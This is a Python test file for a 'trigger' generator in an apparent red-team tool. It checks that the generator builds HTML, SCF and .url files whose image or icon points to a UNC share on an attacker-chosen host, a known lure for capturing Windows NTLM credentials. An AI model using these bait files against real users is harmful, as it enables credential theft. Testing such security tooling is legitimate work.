"""Trigger-link generator tests - pure string generation, nothing installed needed.

Run:  python tests/test_trigger.py    (or)   python -m pytest -q
"""
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from redness import trigger  # noqa: E402


def test_unc_path_defaults():
    assert trigger.unc_path("10.10.0.5") == r"\\10.10.0.5\share\x.jpg"


def test_unc_path_custom_and_strips_host():
    assert trigger.unc_path("  srv  ", "s2", "doc.docx") == r"\\srv\s2\doc.docx"


def test_html_embeds_unc_img():
    out = trigger.generate("html", "10.10.0.5")
    assert r'src="\\10.10.0.5\share\x.jpg"' in out
    assert "<img" in out


def test_scf_has_shell_and_iconfile():
    out = trigger.generate("scf", "10.10.0.5")
    assert "[Shell]" in out
    assert r"IconFile=\\10.10.0.5\share\x.jpg" in out


def test_url_has_internetshortcut_and_iconfile():
    out = trigger.generate("url", "10.10.0.5")
    assert "[InternetShortcut]" in out
    assert r"IconFile=\\10.10.0.5\share\x.jpg" in out


def test_generate_unknown_format_raises():
    try:
        trigger.generate("lnk", "10.10.0.5")
    except ValueError:
        pass
    else:
        raise AssertionError("expected ValueError for unknown format")


def test_formats_registry_v1():
    assert set(trigger.FORMATS) == {"html", "scf", "url"}


if __name__ == "__main__":
    passed = 0
    for name, fn in sorted(globals().items()):
        if name.startswith("test_") and callable(fn):
            fn()
            print(f"  ok  {name}")
            passed += 1
    print(f"\n{passed} tests passed")
